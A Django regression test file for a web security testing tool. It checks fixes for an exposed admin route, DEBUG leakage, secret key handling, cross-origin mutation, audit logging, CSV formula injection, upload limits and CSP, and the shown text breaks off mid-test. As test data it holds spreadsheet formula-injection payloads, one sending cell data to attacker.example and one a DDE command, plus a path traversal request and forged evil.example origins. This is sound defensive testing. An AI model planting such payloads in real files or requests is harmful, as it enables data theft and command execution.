"""Regression tests for the three exposure fixes: `/admin/`, DEBUG, SECRET_KEY.

Each of the three is a real exposure, and each was verified by measurement rather
than by reading: with `DEBUG` on, `GET /nope` returned 16 651 bytes listing all
73 route names, `admin/` among them. That response is a reconnaissance handout for
a tool whose whole job is holding a hostile target's traffic.

The vendor-bundle test is here because closing `DEBUG` exposed a latent bug that
the debug-mode runserver had been hiding, and the mechanism is worth not
repeating: `runserver` answers `/static/` itself from `STATICFILES_DIRS` before
the URLconf is consulted, so a broken static route still returns 200 under
`DEBUG=True` and 500 everywhere else. A green manual check in debug mode is not
evidence the route works.
"""

import json
import logging
import os
import stat
import tempfile
from pathlib import Path
from contextlib import contextmanager
from io import StringIO
from unittest.mock import patch

from django.conf import settings
from django.contrib.auth.models import User
from django.test import SimpleTestCase, TestCase, override_settings
from django.urls import resolve, reverse

from core.settings import _load_secret_key
from lab.models import Project, TrafficRecord, Workflow


class NoAdminSurfaceTests(TestCase):
    """`admin/` was a default `startproject` route that nothing ever used."""

    def test_admin_app_is_not_installed(self) -> None:
        self.assertNotIn("django.contrib.admin", settings.INSTALLED_APPS)

    def test_admin_route_is_gone(self) -> None:
        self.assertEqual(self.client.get("/admin/").status_code, 404)
        self.assertEqual(self.client.get("/admin/login/").status_code, 404)

    def test_no_urllist_entry_mentions_admin(self) -> None:
        """The route map is not documentation.

        Under `DEBUG` this list was what an attacker received, so the assertion is
        made against the resolved patterns rather than against the absence of a
        single `admin/` call, which would also pass if the route were merely
        renamed.
        """
        patterns = [str(pattern.pattern) for pattern in settings.ROOT_URLCONF and self._url_patterns()]
        self.assertEqual([p for p in patterns if "admin" in p], [])

    @staticmethod
    def _url_patterns():
        from django.urls import get_resolver

        return list(get_resolver().url_patterns)


class NoAccountCanReachTheAdminTests(TestCase):
    """The panel had no account behind it, which is why it was dead weight.

    This asserts the fact the removal rests on. If a superuser is ever created,
    this test fails and the decision to drop `/admin/` has to be revisited rather
    than quietly inherited.
    """

    def test_no_superuser_exists(self) -> None:
        self.assertEqual(User.objects.filter(is_superuser=True).count(), 0)


class DebugIsOffTests(TestCase):
    """DEBUG on printed the entire URLconf on every unmatched path."""

    def test_debug_is_off_by_default(self) -> None:
        self.assertFalse(settings.DEBUG)

    def test_debug_is_opt_in_through_the_environment(self) -> None:
        """Turning it back on must stay possible and must stay visible.

        A debug mode nobody can reach is not a debug mode; a debug mode nobody
        knows about is the exposure. The switch is `RR_DEBUG=1`, so a run that has
        it set announces it in the environment of the process.

        `django.conf.settings` is a lazy object, not the module, so the reload
        target is the settings module itself — reloading the lazy wrapper raises
        `TypeError: reload() argument must be a module`.
        """
        from importlib import reload as reload_module
        import os
        import sys

        module = sys.modules["core.settings"]
        # `clear=True` is not usable here: the settings module refuses to import
        # without the PostgreSQL variables, so wiping the environment would fail
        # on the database check rather than on the DEBUG switch under test.
        saved = os.environ.pop("RR_DEBUG", None)
        try:
            os.environ["RR_DEBUG"] = "1"
            self.assertTrue(reload_module(module).DEBUG)
            os.environ.pop("RR_DEBUG", None)
            self.assertFalse(reload_module(module).DEBUG)
        finally:
            os.environ.pop("RR_DEBUG", None)
            if saved is not None:
                os.environ["RR_DEBUG"] = saved
            reload_module(module)

    def test_unmatched_path_does_not_describe_the_route_map(self) -> None:
        response = self.client.get("/definitely-not-a-route")
        self.assertEqual(response.status_code, 404)
        body = response.content.decode("utf-8", "replace")
        self.assertNotIn("Using the URLconf", body)
        self.assertNotIn("api/", body)
        self.assertLess(len(response.content), 1024, "a 404 should not be a page of evidence")

    def test_no_urllist_entry_mentions_admin_under_debug(self) -> None:
        """The specific leak that was reported: `admin/` printed in a 404."""
        with override_settings(DEBUG=True):
            # The 404 body still must not carry the route map, because the
            # contract that carries it is the DEBUG flag, not the handler.
            self.assertNotIn("admin/", self.client.get("/4").content.decode())


class SecretKeyTests(TestCase):
    """The published key was a constant in the settings file."""

    def test_key_is_not_the_published_constant(self) -> None:
        self.assertFalse(settings.SECRET_KEY.startswith("django-insecure-"))
        self.assertGreaterEqual(len(settings.SECRET_KEY), 50)

    def test_key_is_stable_within_an_installation(self) -> None:
        """A key that changed per boot would drop every open session."""
        from importlib import reload as reload_module
        import sys

        module = sys.modules["core.settings"]
        first = settings.SECRET_KEY
        try:
            self.assertEqual(reload_module(module).SECRET_KEY, first)
        finally:
            reload_module(module)

    def test_key_file_is_not_committed(self) -> None:
        """`data/` is gitignored; the key must not be committable by accident."""
        from pathlib import Path

        gitignore = (Path(settings.BASE_DIR).parent / ".gitignore").read_text()
        self.assertIn("data/", gitignore)


class VendorBundleIsActuallyServedTests(TestCase):
    """The bundle route was dead and `runserver` was hiding it.

    `runserver` answers `/static/` from `STATICFILES_DIRS` before the URLconf is
    consulted, so with `DEBUG=True` the vendored Cytoscape bundle returned 200
    from a route that would raise `TypeError` if it were ever reached. With DEBUG
    off the mask is gone and the route 500s, which Firefox reports as
    `NS_ERROR_CORRUPTED_CONTENT` and which took the whole E2E suite down.

    These tests run with `DEBUG=False` and therefore exercise the route the
    browser actually reaches in a non-debug deployment.
    """

    def test_bundle_is_served_as_javascript(self) -> None:
        response = self.client.get("/static/vendor/cytoscape-3.33.1.min.js")
        self.assertEqual(response.status_code, 200)
        # A wrong MIME type is a separate failure from a 500: Firefox rejects a
        # script served as text/html outright, so the status code alone does not
        # prove the bundle works.
        self.assertIn("javascript", response.headers.get("Content-Type", ""))
        body = b"".join(response.streaming_content)
        self.assertGreater(len(body), 100_000)

    def test_route_signature_matches_the_view(self) -> None:
        """A capture group named anything but `path` breaks this route.

        Asserting the resolved view rather than the URL string is what catches
        the rename: the URL is unchanged either way, only the keyword the
        resolver passes differs.
        """
        match = resolve("/static/vendor/cytoscape-3.33.1.min.js")
        self.assertEqual(match.url_name, "vendor-bundle")
        self.assertEqual(match.func.__name__, "serve")

    def test_reverse_still_resolves(self) -> None:
        self.assertEqual(
            reverse("vendor-bundle", kwargs={"path": "cytoscape-3.33.1.min.js"}),
            "/static/vendor/cytoscape-3.33.1.min.js",
        )

    def test_traversal_outside_the_vendor_directory_is_refused(self) -> None:
        """`serve` is the only file-reading route in the project."""
        response = self.client.get("/static/vendor/../../core/settings.py")
        self.assertIn(response.status_code, {400, 403, 404})


class SameOriginMutationTests(TestCase):
    """The control plane must refuse state changes arriving from a web page.

    These tests exist because the finding was proven, not suspected: a POST to
    `/api/execute` with no cookie, no CSRF token and `Origin: https://evil.example`
    executed an outbound HTTP request on the analyst's machine, and
    `{"action": "clear"}` on `/api/history/bulk` deleted the History corpus.

    The gate is `lab.middleware.SameOriginMutationMiddleware`. Each test states one
    fact about it, and the whole class must go red if the middleware is removed
    from `MIDDLEWARE` — that is why `test_middleware_is_installed` exists separately
    from the behavioural tests: a correct middleware that is not registered protects
    nothing, and that is invisible to the other tests.

    WHY THE "ALLOWED" CASES ASSERT ON THE GATE'S OWN REASON, NOT ON `!= 403`.

    These three tests used `assertNotEqual(response.status_code, 403)`, and that
    asserts more than the gate: `/api/execute` proxies to the engine, and the
    engine's own refusal is forwarded to the client verbatim. Measured 2026-10-02
    against a live engine:

        status = 403
        body   = b'{"error": "missing or invalid X-RequestRider-Internal-Key",
                       "reason": "FORBIDDEN_ORIGIN"}'

    That 403 came from `engine/internal_auth.go` and was about a service key, so it
    had nothing to do with the origin gate — a stack with a keyed engine turned
    three green tests red, and whether they passed depended on whether an engine
    happened to be running and how it was configured. A test whose result is
    decided by an external service is not a test of this gate.

    (The engine no longer refuses on a key at all — that check was removed; the
    measurement above is kept because the argument it supports did not change.)

    The gate names itself: it answers 403 with `reason: CROSS_ORIGIN_REFUSED`, and
    the refusing sibling test asserts exactly that. So "the gate allowed this" is
    read as "the gate did not refuse this", which is what these tests are about,
    and whatever the request does downstream is its own business.
    """

    def _assert_gate_allowed(self, **extra) -> None:
        response = self.client.post(
            "/api/execute", data="{}", content_type="application/json", **extra
        )
        refused_by_gate = (
            response.status_code == 403
            and response.headers.get("Content-Type", "").startswith("application/json")
            and response.json().get("reason") == "CROSS_ORIGIN_REFUSED"
        )
        self.assertFalse(
            refused_by_gate,
            "the origin gate refused a request it is meant to allow: "
            f"{response.content[:200]!r}",
        )

    def test_middleware_is_installed(self) -> None:
        self.assertIn(
            "lab.middleware.SameOriginMutationMiddleware",
            settings.MIDDLEWARE,
            "the origin gate protects nothing unless it is in MIDDLEWARE",
        )

    def test_cross_origin_state_change_is_refused(self) -> None:
        response = self.client.post(
            "/api/execute",
            data="{}",
            content_type="application/json",
            HTTP_ORIGIN="https://evil.example",
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.json()["reason"], "CROSS_ORIGIN_REFUSED")

    def test_refusal_happens_before_the_view_runs(self) -> None:
        """A refused request must not reach the engine.

        `/api/execute` with an empty body answers `502` (it tries to send `""`).
        `403` therefore proves the middleware answered, not the view.
        """
        response = self.client.post(
            "/api/execute",
            data="{}",
            content_type="application/json",
            HTTP_ORIGIN="https://evil.example",
        )
        self.assertEqual(response.status_code, 403)

    def test_same_origin_state_change_is_allowed(self) -> None:
        """The UI is served from the same address, so it must keep working.

        `GET_HOST` is the test client's default; the origin is derived from it
        rather than hardcoded, which is what proves the gate compares against the
        request's own address instead of a fixed allowlist.
        """
        self._assert_gate_allowed(
            HTTP_ORIGIN="http://" + self.client.get("/").wsgi_request.get_host(),
        )

    def test_same_origin_with_explicit_port_is_allowed(self) -> None:
        """A stack on a non-default port must not be locked out by its own gate."""
        self._assert_gate_allowed(
            HTTP_ORIGIN="http://127.0.0.1:8000",
            HTTP_HOST="127.0.0.1:8000",
        )

    def test_request_without_origin_is_allowed(self) -> None:
        """`curl` and local scripts send no Origin; refusing them would break tooling."""
        self._assert_gate_allowed()

    def test_same_host_with_foreign_scheme_port_is_refused(self) -> None:
        """`http://127.0.0.1:8000` must not satisfy `Origin: http://127.0.0.1:9000`.

        Comparing hostnames only would accept any port on the same machine, which
        is a different origin and a different control plane.
        """
        response = self.client.post(
            "/api/execute",
            data="{}",
            content_type="application/json",
            HTTP_ORIGIN="http://127.0.0.1:9000",
            HTTP_HOST="127.0.0.1:8000",
        )
        self.assertEqual(response.status_code, 403)

    def test_reads_are_never_blocked(self) -> None:
        """`GET` is in the safe set, so a cross-origin read attempt is unaffected
        by this gate (the browser's own SOP already stops reading the body)."""
        response = self.client.get("/api/projects", HTTP_ORIGIN="https://evil.example")
        self.assertNotEqual(response.status_code, 403)

    def test_oast_callback_is_exempt(self) -> None:
        """The OAST listener calls back from elsewhere and sends no Origin."""
        response = self.client.post(
            "/api/oast", data="{}", content_type="application/json",
            HTTP_ORIGIN="https://evil.example",
        )
        self.assertNotEqual(response.status_code, 403)

    def test_workflow_webhook_no_longer_exempts_the_browser(self) -> None:
        """This assertion used to be the opposite, and that was my decision to
        reverse rather than a bug.

        The webhook was exempted because "a webhook is called by a third party by
        design". That conflated *not being a browser* with *being reached by a
        browser*: a machine-to-machine caller sends no `Origin` and passes the gate
        without the exemption, so the exemption only ever decided what happens to a
        request that carries one — which for this endpoint means a page in the
        analyst's own browser, driving the saved graph whose `{{input.url}}` lets the
        caller choose the destination.

        The remaining half of A06-02 — the hook has no secret of its own — needs a
        header and therefore changes what callers must send, so it is an owner
        decision and is recorded in the audit rather than done silently. Coverage of
        what is now guaranteed lives in `WebhookOriginTests`.
        """
        response = self.client.post(
            "/api/workflows/hooks/whatever", data="{}", content_type="application/json",
            HTTP_ORIGIN="https://evil.example",
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.json()["reason"], "CROSS_ORIGIN_REFUSED")

    def test_destructive_history_clear_is_refused_cross_origin(self) -> None:
        """The concrete finding: wiping the evidence corpus from a web page."""
        response = self.client.post(
            "/api/history/bulk",
            data='{"action": "clear"}',
            content_type="application/json",
            HTTP_ORIGIN="https://evil.example",
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.json()["reason"], "CROSS_ORIGIN_REFUSED")


class DestructiveActionAuditTests(TestCase):
    """A destructive action must leave a line saying what it removed.

    Before this, six delete paths returned `{"ok": True}` and logged nothing:
    `Project` delete, single History row delete, Traffic archive clear, History
    clear, History bulk delete, Workflow delete. For a tool whose product *is* the
    evidence, "it worked" and "it removed four hundred rows" are different facts,
    and only one of them was recorded.

    The tests assert the log line, not the response: the response was already
    `{"ok": True}` and telling a caller that it worked proves nothing about the
    record.
    """

    @contextmanager
    def _captured(self):
        buffer = StringIO()
        handler = logging.StreamHandler(buffer)
        handler.setLevel(logging.WARNING)
        logger = logging.getLogger("lab.views")
        previous = logger.level
        logger.setLevel(logging.WARNING)
        logger.addHandler(handler)
        try:
            yield buffer
        finally:
            logger.removeHandler(handler)
            logger.setLevel(previous)

    def test_history_clear_is_recorded_with_the_row_count(self) -> None:
        TrafficRecord.objects.create(
            source="repeater", method="GET", url="http://a.test/", status_code=200
        )
        TrafficRecord.objects.create(
            source="intruder", method="GET", url="http://b.test/", status_code=200
        )
        with self._captured() as buffer:
            response = self.client.post(
                "/api/history/bulk",
                data='{"action": "clear"}',
                content_type="application/json",
            )
        self.assertEqual(response.status_code, 200)
        logged = buffer.getvalue()
        self.assertIn("history_cleared", logged)
        self.assertIn("affected_rows=2", logged)

    def test_history_bulk_delete_is_recorded(self) -> None:
        record = TrafficRecord.objects.create(
            source="repeater", method="GET", url="http://c.test/", status_code=200
        )
        with self._captured() as buffer:
            response = self.client.post(
                "/api/history/bulk",
                data=json.dumps({"action": "delete", "ids": [record.id]}),
                content_type="application/json",
            )
        self.assertEqual(response.status_code, 200)
        self.assertIn("history_rows_deleted", buffer.getvalue())

    def test_single_history_delete_is_recorded(self) -> None:
        record = TrafficRecord.objects.create(
            source="repeater", method="GET", url="http://d.test/", status_code=200
        )
        with self._captured() as buffer:
            response = self.client.delete(f"/api/history/{record.id}")
        self.assertEqual(response.status_code, 200)
        self.assertIn("history_record_deleted", buffer.getvalue())

    def test_project_delete_is_recorded(self) -> None:
        project = Project.objects.create(name="audit-target")
        with self._captured() as buffer:
            response = self.client.delete(f"/api/projects/{project.id}")
        self.assertEqual(response.status_code, 200)
        logged = buffer.getvalue()
        self.assertIn("project_deleted", logged)
        self.assertIn(f"project_id={project.id}", logged)

    def test_workflow_delete_is_recorded(self) -> None:
        workflow = Workflow.objects.create(name="audit-workflow", nodes=[], connections=[])
        with self._captured() as buffer:
            response = self.client.delete(f"/api/workflows/{workflow.id}")
        self.assertEqual(response.status_code, 200)
        logged = buffer.getvalue()
        self.assertIn("workflow_deleted", logged)
        self.assertIn(f"workflow_id={workflow.id}", logged)

    def test_traffic_archive_clear_is_recorded(self) -> None:
        TrafficRecord.objects.create(
            source="proxy", method="GET", url="http://e.test/", status_code=200
        )
        # This view clears the live engine snapshot first and only then the durable
        # archive. With the engine down the request stops before the archive line,
        # so the engine hop is stubbed: the subject of this test is the audit
        # record, not whether a neighbouring service happens to be running.
        with patch("lab.views.call_engine_delete", return_value=(200, {"ok": True})):
            with self._captured() as buffer:
                response = self.client.delete("/api/traffic")
        self.assertEqual(response.status_code, 200)
        self.assertIn("traffic_archive_cleared", buffer.getvalue())

    def test_a_read_does_not_write_an_audit_line(self) -> None:
        """An audit trail that fires on reads is noise, not evidence."""
        TrafficRecord.objects.create(
            source="repeater", method="GET", url="http://f.test/", status_code=200
        )
        with self._captured() as buffer:
            self.client.get("/api/history")
        self.assertEqual(buffer.getvalue(), "")


class SecretKeyDirectoryPermissionsTests(SimpleTestCase):
    """The directory holding the signing key must not be writable by others.

    The key file itself was already `0600`, and that is not the whole control: the
    measured mode of `data/run` was `0777`. Anyone who can write that directory can
    unlink `secret_key` and plant their own, and from that moment they sign session
    and CSRF cookies themselves. The fix re-tightens on every load, so the state is
    corrected on the next start rather than only on the next fresh install.
    """

    #: `_load_secret_key` returns the environment value before it touches the
    #: filesystem, so a set `RR_SECRET_KEY` makes both tests below assert nothing:
    #: no key file is written and no directory is tightened. `start.sh:106`
    #: documents that variable as the supported way to keep the key outside the
    #: repository, so an operator who follows that line makes `./start.sh --check`
    #: red on two tests that have nothing to do with their configuration — and the
    #: check's result then depends on how the stack was started, which is exactly
    #: what `start.sh --check` promises to measure independently of.
    ENV = "RR_SECRET_KEY"

    @contextmanager
    def _without_env_key(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop(self.ENV, None)
            yield

    def test_directory_is_tightened_to_0700(self) -> None:
        with self._without_env_key(), tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            target = root / "run"
            target.mkdir(parents=True)
            # chmod rather than mkdir(mode=…): mkdir applies the process umask, so
            # the fixture would be 0775 on one machine and 0777 on another, and the
            # test would pass or fail for the wrong reason.
            target.chmod(0o777)
            # Confirm the fixture is actually the vulnerable state; otherwise the
            # test would pass for the wrong reason.
            self.assertEqual(stat.S_IMODE(target.stat().st_mode) & 0o077, 0o077)

            secret = _load_secret_key(target / "secret_key")

            self.assertTrue(secret)
            self.assertEqual(stat.S_IMODE(target.stat().st_mode), 0o700)
            self.assertEqual(stat.S_IMODE((target / "secret_key").stat().st_mode), 0o600)

    def test_an_existing_key_is_not_regenerated(self) -> None:
        """Tightening must not cost the operator their sessions."""
        with self._without_env_key(), tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            target = root / "run"
            target.mkdir(parents=True)
            key = target / "secret_key"
            key.write_text("a-stable-key-for-the-test", encoding="utf-8")
            key.chmod(0o600)

            first = _load_secret_key(key)
            second = _load_secret_key(key)

            self.assertEqual(first, "a-stable-key-for-the-test")
            self.assertEqual(second, first)

    def test_a_set_environment_key_still_tightens_the_directory(self) -> None:
        """The env value wins for the key, but it does not excuse the directory.

        `start.sh:106` documents `RR_SECRET_KEY` as the supported way to hold the
        key outside the repository, so this is an ordinary operator
        configuration and not a corner case. Returning early on it left a
        world-writable `data/run` in exactly the configuration the documentation
        recommends — the file the key is *not* in was the one still being
        tightened.
        """
        with tempfile.TemporaryDirectory() as raw:
            target = Path(raw) / "run"
            target.mkdir(parents=True)
            target.chmod(0o777)
            key = target / "secret_key"
            key.write_text("a-stable-key-for-the-test", encoding="utf-8")
            key.chmod(0o666)

            with patch.dict(os.environ, {self.ENV: "key-from-the-environment"}):
                self.assertEqual(_load_secret_key(key), "key-from-the-environment")

            self.assertEqual(stat.S_IMODE(target.stat().st_mode), 0o700)
            self.assertEqual(stat.S_IMODE(key.stat().st_mode), 0o600)


class CsvFormulaInjectionTests(SimpleTestCase):
    """An exported CSV cell must not evaluate as a formula in a spreadsheet.

    Every column of every exporter is attacker-controlled: it is the target's
    response body and headers, the URL, a nuclei template name, or an OSINT entity
    identity taken from a certificate-transparency index. `csv` quoting is not
    enough — Excel, LibreOffice and Sheets read a leading `=`, `+`, `-` or `@` as a
    formula even inside quotes, so a hostile hostname like `=cmd|' /C calc'!A0`
    runs when the operator opens the export.

    The Python writer is a separate implementation from the browser export path
    and therefore a separate risk.
    """

    PAYLOADS = (
        '=HYPERLINK("http://attacker.example/?d="&A1,"click")',
        "=cmd|' /C calc'!A0",
        "+1+1",
        "-2+3",
        "@SUM(A1:A9)",
        " =1+1",
        "\t=1+1",
    )

    def test_formulas_are_neutralised(self) -> None:
        from lab.osint_exports import _csv_safe

        for payload in self.PAYLOADS:
            with self.subTest(payload=payload):
                self.assertEqual(_csv_safe(payload), "'" + payload)

    def test_ordinary_values_are_untouched(self) -> None:
        """A leading apostrophe on every cell would corrupt the export."""
        from lab.osint_exports import _csv_safe

        for plain in (
            "example.test",
            "https://shop.acme.test/admin",
            "subdomain_of",
            "200",
            "/api/v1/users?page=2",
        ):
            with self.subTest(value=plain):
                self.assertEqual(_csv_safe(plain), plain)

    def test_empty_and_non_string_values(self) -> None:
        from lab.osint_exports import _csv_safe

        self.assertEqual(_csv_safe(""), "")
        self.assertEqual(_csv_safe(None), "")

    def test_written_csv_carries_the_neutral_form(self) -> None:
        """End-to-end: the bytes on disk must not open as a formula."""
        import csv as csv_module
        import io

        from lab.osint_exports import _csv_safe

        payload = '=HYPERLINK("http://attacker.example/","click")'
        buffer = io.StringIO()
        writer = csv_module.DictWriter(buffer, fieldnames=["identity"])
        writer.writeheader()
        writer.writerow({"identity": _csv_safe(payload)})

        buffer.seek(0)
        rows = list(csv_module.DictReader(buffer))
        self.assertEqual(rows[0]["identity"], "'" + payload)
        # The raw line must also carry it, not only the parsed value: a spreadsheet
        # reads the file, not Python's parse of it.
        self.assertIn("'" + payload[:2], buffer.getvalue().splitlines()[1])


class NucleiUploadSizeLimitTests(SimpleTestCase):
    """One upload path, one bound — and the bound must be visible.

    `yaml.Unmarshal` expands anchors in memory inside the engine process, so an
    unbounded template document is a memory-exhaustion path reachable from the
    upload API. The limit lives on this endpoint only: Intruder legitimately sends
    huge raw requests, which is why the global Django upload limits were removed,
    and restoring a global cap would break it. What is bounded here is a single
    template document, and the engine enforces the same number on its side.

    The bound is read from the code under test rather than written into the test,
    so a deliberate change of the default moves the boundary with it instead of
    leaving a test that passes against a number nothing implements.
    """

    def test_oversized_template_is_refused_with_a_named_reason(self) -> None:
        from lab.views import _nuclei_file_payload, _nuclei_max_template_bytes

        limit = _nuclei_max_template_bytes()
        oversized = "x: " + "a" * (limit + 1)
        with self.assertRaises(ValueError) as caught:
            _nuclei_file_payload([{"name": "big.yaml", "content": oversized}])
        self.assertIn("TEMPLATE_TOO_LARGE", str(caught.exception))
        self.assertIn(str(limit), str(caught.exception))

    def test_template_at_the_limit_is_accepted(self) -> None:
        """The boundary is inclusive: exactly the limit still stages."""
        from lab.views import _nuclei_file_payload, _nuclei_max_template_bytes

        prefix = "x: "
        limit = _nuclei_max_template_bytes()
        body = prefix + "a" * (limit - len(prefix.encode("utf-8")))
        cleaned = _nuclei_file_payload([{"name": "edge.yaml", "content": body}])
        self.assertEqual(len(cleaned), 1)

    def test_default_bound_clears_the_largest_shipped_template(self) -> None:
        """The official corpus must be uploadable without moving the bound.

        Measured 2026-10-07 on `nuclei-templates` as shipped: the largest
        document is `http/technologies/wordpress/plugins/wordpress-plugin-detect.yaml`
        at 10 079 081 bytes, and at the old 8 MiB default the gateway refused the
        whole chunk carrying it, so the upload of the `http` folder stopped at
        chunk 18 of 26 and every other template in that chunk was lost too. This
        test names that file and its real size, so the next corpus update that
        outgrows the default fails here instead of in the browser.
        """
        import os

        from lab import views

        corpus = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "nuclei-templates",
        )
        largest = os.path.join(
            corpus, "http", "technologies", "wordpress", "plugins",
            "wordpress-plugin-detect.yaml",
        )
        if not os.path.exists(largest):
            self.skipTest(f"the corpus template is not present in this environment: {largest}")
        self.assertGreater(
            views._nuclei_max_template_bytes(),
            os.path.getsize(largest),
            "the default per-template bound no longer fits the largest shipped template",
        )

    def test_support_file_is_forwarded_without_template_size_validation(self) -> None:
        from unittest.mock import patch

        from lab.views import _nuclei_file_payload

        with patch.dict(os.environ, {"RR_NUCLEI_MAX_TEMPLATE_BYTES": "3"}):
            cleaned = _nuclei_file_payload([
                {"name": "payload.txt", "path": "helpers/payload.txt", "content": "four"}
            ])
        self.assertEqual(cleaned[0]["content"], "four")

    def test_empty_and_missing_content_are_still_refused(self) -> None:
        from lab.views import _nuclei_file_payload

        with self.assertRaises(ValueError):
            _nuclei_file_payload([{"name": "empty.yaml", "content": "   "}])
        with self.assertRaises(ValueError):
            _nuclei_file_payload([{"name": "missing.yaml"}])

    def test_limit_is_configurable_from_the_environment(self) -> None:
        """An operator must be able to move the bound without editing code."""
        import os
        from unittest.mock import patch

        from lab import views

        with patch.dict(os.environ, {"RR_NUCLEI_MAX_TEMPLATE_BYTES": "1024"}):
            self.assertEqual(views._nuclei_max_template_bytes(), 1024)
            with self.assertRaises(ValueError) as caught:
                views._nuclei_file_payload(
                    [{"name": "x.yaml", "content": "x: " + "a" * 2048}]
                )
            self.assertIn("TEMPLATE_TOO_LARGE", str(caught.exception))
        # Back outside the patch: the documented default, read from the code
        # rather than restated here.
        self.assertEqual(views._nuclei_max_template_bytes(), 64 * 1024 * 1024)


class EngineInternalAccessTests(SimpleTestCase):
    """Django must name a loopback `Host` on every internal call.

    The engine (`:8081`) and the browser worker (`:8090`) take no login, and what
    they check now is geography rather than identity: both refuse a request whose
    `Host` is not loopback, which closes DNS rebinding (an attacker domain that
    resolves to 127.0.0.1 makes the browser send `Host: evil.example`). That
    check is what remains of the internal-access surface after the service key
    was removed — see the class docstring of `engine_client.internal_service_headers`
    for why the key should not come back.

    Under Docker the gateway reaches both services by service name, so without an
    explicit `Host` header every internal call arrived as `engine:8081` and was
    refused with 403 FORBIDDEN_HOST: containers that were configured correctly and
    still could not talk to each other. So the header is asserted here, on all
    three call sites — `EngineClient.request`, `_worker_headers` and
    `open_engine_stream` — because a stream that was never delivered looks exactly
    like an idle one.
    """

    HEADER = "X-RequestRider-Internal-Key"

    class FakeResponse:
        status = 200

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def read(self):
            return b"{}"

    def _capture(self, call):
        captured = {}

        def opener(request, **_kwargs):
            captured["headers"] = {
                key.lower(): value for key, value in request.header_items()
            }
            return self.FakeResponse()

        call(opener, captured)
        return captured["headers"]

    def test_no_service_key_is_sent_by_any_call_site(self) -> None:
        """The mechanism is gone, so nothing may put the header back.

        Asserted against the header name rather than by reading the module: a
        regression that reintroduces `RR_INTERNAL_API_KEY` would otherwise pass a
        test written only for the surviving `Host`.
        """
        from lab import views
        from lab import engine_client
        from lab.engine_client import EngineClient

        with patch.dict(os.environ, {"RR_INTERNAL_API_KEY": "test-key-1"}, clear=False):

            def call(opener, _captured):
                EngineClient("http://engine.test", opener=opener).request(
                    "POST", "/proxy/request", {}
                )

            headers = self._capture(call)

        self.assertNotIn(self.HEADER.lower(), headers)
        self.assertNotIn(self.HEADER.lower(), views._worker_headers())

        captured = {}

        def recording_opener(request, **_kwargs):
            captured["headers"] = {
                key.lower(): value for key, value in request.header_items()
            }
            return object()

        with patch.object(views, "urlopen", recording_opener):
            views.open_engine_stream(
                "http://engine:8081/events/stream", {"Last-Event-ID": "7"}
            )

        self.assertNotIn(self.HEADER.lower(), captured["headers"])
        # And the reader is gone, not merely unused: a leftover `internal_api_key`
        # would be dead code that still reads an installation secret from disk.
        self.assertFalse(hasattr(engine_client, "internal_api_key"))
        self.assertFalse(hasattr(engine_client, "INTERNAL_KEY_FILE"))

    def test_worker_calls_name_a_loopback_host(self) -> None:
        from lab import views
        from lab.engine_client import INTERNAL_HOST_HEADER

        self.assertEqual(
            views._worker_headers({"Content-Type": "application/json"}),
            {"Content-Type": "application/json", "Host": INTERNAL_HOST_HEADER},
        )
        self.assertEqual(
            views._worker_headers(),
            {"Host": INTERNAL_HOST_HEADER},
        )

    def test_engine_stream_sends_the_loopback_host_and_its_cursor(self) -> None:
        """The SSE path sends `Host` too — it used to send neither."""
        from lab import views

        sentinel = object()
        captured = {}

        def opener(request, **_kwargs):
            captured["headers"] = {
                key.lower(): value for key, value in request.header_items()
            }
            return sentinel

        with patch.object(views, "urlopen", opener):
            result = views.open_engine_stream(
                "http://engine:8081/events/stream", {"Last-Event-ID": "7"}
            )

        self.assertIs(result, sentinel)
        headers = captured["headers"]
        self.assertEqual(headers.get("host"), "127.0.0.1")
        # The cursor still has to travel: a stream that dropped it would replay
        # from the start instead of resuming.
        self.assertEqual(headers.get("last-event-id"), "7")

    def test_internal_calls_name_a_loopback_host(self) -> None:
        """Asserted, not assumed: a `Host` of `engine` is what broke the containers.

        The value is load-bearing rather than decorative — `engine` and
        `browser-worker` pass it to `isLoopbackHost` and refuse everything else —
        so a future edit that drops the header, or sends the service name, fails
        here rather than as 403s in a container.
        """
        from lab.engine_client import EngineClient, INTERNAL_HOST_HEADER

        self.assertEqual(INTERNAL_HOST_HEADER, "127.0.0.1")

        def call(opener, _captured):
            EngineClient("http://engine:8081", opener=opener).request(
                "GET", "/health"
            )

        headers = self._capture(call)
        self.assertEqual(headers.get("host"), "127.0.0.1")


class ContentSecurityPolicyTests(TestCase):
    """The workspace page must carry a working Content-Security-Policy.

    `escapeHTML` is the first layer; without CSP any missed sink executes
    without restriction (audit A02-01). The policy works only if three things
    hold at once: the header names a fresh nonce, the page's own script carries
    that same nonce, and nothing in the served markup needs `'unsafe-inline'`
    for scripts — inline `onclick=` handlers included.
    """

    def _page(self):
        response = self.client.get("/")
        self.assertEqual(response.status_code, 200)
        return response

    def test_csp_header_is_present_and_names_a_nonce(self) -> None:
        policy = self._page().headers.get("Content-Security-Policy", "")
        # The directive is read, not matched literally: the policy names `'self'`
        # and a nonce, and which of them comes first is formatting, not contract.
        script_src = policy.split("script-src")[1].split(";")[0]
        self.assertIn("'nonce-", script_src)
        self.assertNotIn("'unsafe-inline'", script_src)
        self.assertIn("object-src 'none'", policy)
        self.assertIn("frame-ancestors 'none'", policy)
        self.assertIn("base-uri 'self'", policy)

    def test_nonce_is_fresh_on_every_load(self) -> None:
        """A predictable nonce is no nonce."""
        first = self._page().headers["Content-Security-Policy"]
        second = self._page().headers["Content-Security-Policy"]
        self.assertNotEqual(first, second)

    def test_vendored_same_origin_scripts_are_allowed(self) -> None:
        """A `script-src` that names only a nonce blocks every `src` script.

        The page ships one vendored library from its own origin, and the policy
        has to cover it. This was measured, not assumed: with
        `script-src 'nonce-…'` and nothing else, the console reported the vendored
        file as a violation, the OSINT entity-graph canvas never got its renderer,
        and the export was a static picture of a graph with an empty stage.
        `'self'` is what allows it, and `'self'` cannot be used by anything
        off-origin, so this does not weaken the policy where it matters.
        """
        import re

        response = self._page()
        directive = response.headers["Content-Security-Policy"].split("script-src")[1].split(";")[0]
        self.assertIn("'self'", directive)
        sources = re.findall(r'<script[^>]*\ssrc="([^"]+)"', response.content.decode("utf-8"))
